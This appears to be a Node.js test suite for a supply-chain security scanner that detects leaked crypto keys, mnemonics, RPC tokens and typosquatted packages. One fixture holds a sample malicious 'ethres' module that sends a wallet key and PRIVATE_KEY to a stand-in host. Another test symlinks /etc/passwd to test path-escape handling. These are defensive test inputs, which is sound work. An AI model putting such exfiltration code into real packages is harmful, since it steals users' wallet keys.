import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pinSnapshot, loadSnapshot, replayEvidence, proveFindings, redactSecret, sha256 } from "../lib/proof-evidence.mjs";
import { cryptoLeads, cryptoDetectors } from "../packs/supply-chain/crypto.mjs";
import { makeLabWorkspace } from "../packs/supply-chain/lab.mjs";
import { captureSnapshot } from "../packs/supply-chain/snapshot.mjs";
import { scanSnapshot, SCANNERS, SYFT } from "../packs/supply-chain/scanners.mjs";
import { mkdirSync } from "node:fs";
import { execFileSync } from "node:child_process";

const temp = () => mkdtempSync(join(tmpdir(), "evidence-test-"));
const remove = (ws) => rmSync(ws, { recursive: true, force: true });

test("evidence requires pinned bytes, an allowlisted detector, and the exact location", async () => {
  const ws = temp();
  try {
    const snapshotHash = pinSnapshot(ws, { headers: { server: "lab" } });
    const detectors = { header: (s, where) => ({ ok: where === "server" && s.headers.server === "lab", detail: "DO NOT ECHO THIS SECRET" }) };
    const evidence = { check: "header", where: "server", snapshotHash };
    const pass = await replayEvidence(ws, evidence, { detectors });
    assert.equal(pass.status, "pass");
    assert.ok(!JSON.stringify(pass).includes("DO NOT ECHO"));
    for (const changed of [{ where: "other" }, { check: "toString" }, { check: "unknown" }, { snapshotHash: "0".repeat(64) }]) {
      assert.equal((await replayEvidence(ws, { ...evidence, ...changed }, { detectors })).status, "fail");
    }
    assert.throws(() => pinSnapshot(ws, { headers: { server: "changed" } }), /already pinned/);
    writeFileSync(join(ws, "snapshot.json"), readFileSync(join(ws, "snapshot.json"), "utf8") + "\n");
    assert.equal((await replayEvidence(ws, evidence, { detectors })).status, "fail");
  } finally { remove(ws); }
});

test("evidence refuses symlink escapes and uses the domain snapshotHash config", () => {
  const ws = temp(), outside = temp();
  try {
    const content = JSON.stringify({ dns: [] });
    writeFileSync(join(outside, "snapshot.json"), content);
    symlinkSync(join(outside, "snapshot.json"), join(ws, "snapshot.json"));
    writeFileSync(join(ws, ".touchstone.json"), JSON.stringify({ snapshotHash: sha256(content) }));
    assert.throws(() => loadSnapshot(ws), /escapes/);
  } finally { remove(ws); remove(outside); }
});

test("batch replay rejects unsupported findings and ranks supported findings worst first", async () => {
  const ws = temp();
  try {
    const snapshotHash = pinSnapshot(ws, { dns: ["record"] });
    const good = { check: "dns", where: 0, snapshotHash };
    const found = [{ severity: "low", evidence: good }, { severity: "critical", evidence: { ...good, check: "missing" } }, { severity: "high", evidence: good }];
    const proven = await proveFindings(ws, found, [], () => {}, { detectors: { dns: (s, w) => ({ ok: s.dns[w] === "record" }) } });
    assert.deepEqual(proven.map((f) => [f.severity, f.proof.status]), [["high", "pass"], ["low", "pass"]]);
  } finally { remove(ws); }
});

test("crypto checks reject scalars and unlabeled bytes32, and derive a known mnemonic account", () => {
  const key = "1".padStart(64, "0"), invalid = "0".repeat(64);
  const phrase = "test test test test test test test test test test test junk";
  const snapshot = { files: { "wallet.env": `PRIVATE_KEY=0x${key}\nPRIVATE_KEY=0x${invalid}\nHASH=0x${key}\nMNEMONIC=${phrase}\nMNEMONIC=test test test test test test test test test test test test\n` } };
  const leads = cryptoLeads(snapshot);
  assert.deepEqual(leads.map((l) => [l.check, l.lines[0], l.address]), [
    ["evm-private-key", 1, "0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf"],
    ["bip39-mnemonic", 4, "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"],
  ]);
  const publicText = JSON.stringify(leads);
  assert.ok(!publicText.includes(phrase));
  assert.ok(!publicText.includes(key));
  assert.deepEqual(redactSecret(`0x${key}`), redactSecret(key.toUpperCase()));
  assert.equal(cryptoDetectors["evm-private-key"](snapshot, { ...leads[0].where, line: 2 }).ok, false);
});

test("RPC provider matching uses hostname boundaries and package warnings bind to one name", () => {
  const token = "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6";
  const snapshot = { files: {
    "rpc.js": `"https://eth-mainnet.g.alchemy.com/v2/${token}"\n"https://mainnet.infura.io/v3/${token}"\n"https://lab.quiknode.pro/${token}/"\n"https://eth-mainnet.g.alchemy.com.evil.invalid/v2/${token}"`,
    "package.json": JSON.stringify({ dependencies: { ethers: "6", ethres: "1", viem: "1", vieem: "1", "@solana/web3.j": "1", unrelated: "1" } }),
  } };
  const leads = cryptoLeads(snapshot);
  assert.deepEqual(leads.filter((l) => l.check === "rpc-provider-key").map((l) => l.provider), ["Alchemy", "Infura", "QuickNode"]);
  assert.deepEqual(leads.filter((l) => l.package).map((l) => l.package), ["ethres", "vieem", "@solana/web3.j"]);
  const where = leads.find((l) => l.package === "ethres").where;
  assert.equal(cryptoDetectors["crypto-package-lookalike"](snapshot, { ...where, package: "ethers" }).ok, false);
  assert.ok(!JSON.stringify(leads).includes(token));
});

test("lab snapshot binds source to a commit and treats keystore address as metadata", async () => {
  const ws = await makeLabWorkspace();
  try {
    const snapshot = captureSnapshot(ws);
    assert.match(snapshot.commit, /^[a-f0-9]{40,64}$/);
    const keystore = cryptoLeads(snapshot).find((l) => l.check === "evm-keystore");
    assert.equal(keystore.addressSource, "keystore-metadata");
    // A dirty working tree never changes the evidence. The commit bytes win.
    writeFileSync(join(ws, "hardhat.config.js"), "changed");
    assert.equal(captureSnapshot(ws).files["hardhat.config.js"], snapshot.files["hardhat.config.js"]);
  } finally { remove(ws); }
});

test("non-object JSON and unrelated config hashes do not become crypto findings", () => {
  const key = "1".padStart(64, "0");
  assert.deepEqual(cryptoLeads({ files: { "null.json": "null", "array.json": "[]", "hardhat.config.js": `const buildHash = \"0x${key}\";` } }), []);
});

const evil = {
  "node_modules/ethres/index.js": "const https = require('https');\nclass Wallet { constructor(k) { https.request({ host: 'x.invalid' }).end(JSON.stringify({ k, e: process.env.PRIVATE_KEY })); } }\n",
  "scripts/deploy.js": "const { Wallet } = require('ethres');\nnew Wallet(process.env.DEPLOYER_KEY);\n",
  "package.json": JSON.stringify({ dependencies: { ethres: "1.0.0", lodash: "4" } }),
  "package-lock.json": JSON.stringify({ packages: { "": {}, "node_modules/lodash": { version: "4.17.21" } } }),
};

test("a malicious dependency that reaches a signer is found and replays at the exact import", () => {
  const leads = cryptoLeads({ files: evil });
  const reach = leads.find((l) => l.check === "dependency-reaches-signer");
  assert.deepEqual([reach.file, reach.lines[0], reach.where.package], ["scripts/deploy.js", 1, "ethres"]);
  assert.ok(leads.some((l) => l.check === "dependency-exfil-code" && l.file === "node_modules/ethres/index.js" && l.lines[0] === 2));
  assert.ok(leads.some((l) => l.check === "dependency-not-in-lockfile" && l.package === "ethres" && l.impact === "Low"));
  const snapshot = { files: evil };
  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, reach.where).ok, true);
  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, { ...reach.where, package: "lodash" }).ok, false);
  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, { ...reach.where, line: 2 }).ok, false);
});

test("an import with no signer context, or from a known-good package, is not a signer reach", () => {
  const noSigner = { ...evil, "scripts/deploy.js": "const x = require('ethres');\n" };
  assert.deepEqual(cryptoLeads({ files: noSigner }).filter((l) => l.check === "dependency-reaches-signer"), []);
  const known = { "package.json": JSON.stringify({ dependencies: { ethers: "6" } }), "scripts/deploy.js": "const { Wallet } = require('ethers');\nnew Wallet(process.env.DEPLOYER_KEY);\n",
    "node_modules/ethers/index.js": "module.exports = {};\n" };
  assert.deepEqual(cryptoLeads({ files: known }), []);
});

test("a folder that is not a git repo is captured; binary, large and reserved files are skipped and listed", () => {
  const dir = temp();
  try {
    mkdirSync(join(dir, "src"));
    mkdirSync(join(dir, ".git"));
    writeFileSync(join(dir, ".git/config"), "never read");
    writeFileSync(join(dir, "src/a.js"), "const a = 1;\n");
    writeFileSync(join(dir, "blob.bin"), Buffer.from([0, 1, 2, 255]));
    writeFileSync(join(dir, "big.txt"), "x".repeat(600 * 1024));
    writeFileSync(join(dir, ".semgrepignore"), "*\n");
    symlinkSync("/etc/passwd", join(dir, "link"));
    const snapshot = captureSnapshot(dir);
    assert.deepEqual(Object.keys(snapshot.files), ["src/a.js"]);
    assert.equal(snapshot.commit, undefined);
    assert.match(snapshot.folderHash, /^[a-f0-9]{64}$/);
    const reasons = Object.fromEntries(snapshot.skipped.map((s) => [s.file, s.reason]));
    assert.deepEqual(reasons, { "blob.bin": "binary-or-not-utf8", "big.txt": "too-large", ".semgrepignore": "reserved-name", link: "not-a-regular-file" });
  } finally { remove(dir); }
});

test("vendored code never starves the project's own files of the byte budget", () => {
  const dir = temp();
  try {
    mkdirSync(join(dir, "node_modules/big"), { recursive: true });
    for (let i = 0; i < 20; i++) writeFileSync(join(dir, `node_modules/big/f${i}.js`), "x".repeat(500 * 1024));
    writeFileSync(join(dir, "app.js"), "const ok = 1;\n");
    const snapshot = captureSnapshot(dir);
    assert.ok(snapshot.files["app.js"]);
    assert.ok(snapshot.skipped.some((s) => s.reason === "over-budget"));
  } finally { remove(dir); }
});

test("every named tool is wrapped through runTool and a missing grype database is a gap, not a clean result", async () => {
  for (const engine of ["gitleaks", "trufflehog", "osv", "grype", "semgrep"]) assert.ok(SCANNERS[engine].image.includes("@sha256:"), `${engine} must be digest pinned`);
  assert.ok(SYFT.image.includes("@sha256:"));
  const old = process.env.TOUCHSTONE_GRYPE_DB;
  process.env.TOUCHSTONE_GRYPE_DB = temp();
  try {
    const r = await scanSnapshot({ files: { "package.json": "{}" }, npmAdvisories: "" }, "grype");
    assert.equal(r.status, "gap");
    assert.deepEqual(r.leads, []);
    assert.match(r.reason, /refresh-db/);
  } finally { if (old === undefined) delete process.env.TOUCHSTONE_GRYPE_DB; else process.env.TOUCHSTONE_GRYPE_DB = old; }
});

test("the lab plants a dependency that no advisory scanner or lockfile knows", async () => {
  const ws = await makeLabWorkspace();
  try {
    const { files } = captureSnapshot(ws);
    assert.ok(files["node_modules/ethres/index.js"], "plant is vendored in the lab workspace");
    assert.ok(!files["package-lock.json"].includes("ethres"));
    const leads = cryptoLeads({ files });
    assert.ok(leads.some((l) => l.check === "dependency-reaches-signer" && l.where.package === "ethres"));
    assert.ok(leads.some((l) => l.check === "dependency-exfil-code" && l.where.package === "ethres"));
  } finally { remove(ws); }
});

test("the evidence viewer shows the real secret hash, never the secret", async () => {
  const { proofView } = await import("../lib/proof-view.mjs");
  const key = `0x${"3".repeat(63)}1`;
  const lead = cryptoLeads({ files: { "hardhat.config.js": `accounts: ["${key}"]\n` } })[0];
  const view = proofView({ proof: { kind: "evidence", status: "pass", check: lead.check, snapshotHash: "a".repeat(64) }, evidence: { check: lead.check, where: lead.where, snapshotHash: "a".repeat(64) } });
  const cell = view.cited.find((c) => c.name === "fingerprint");
  assert.equal(cell.value, lead.secret.sha256);
  assert.ok(!JSON.stringify(view).includes(key.slice(2)));
});
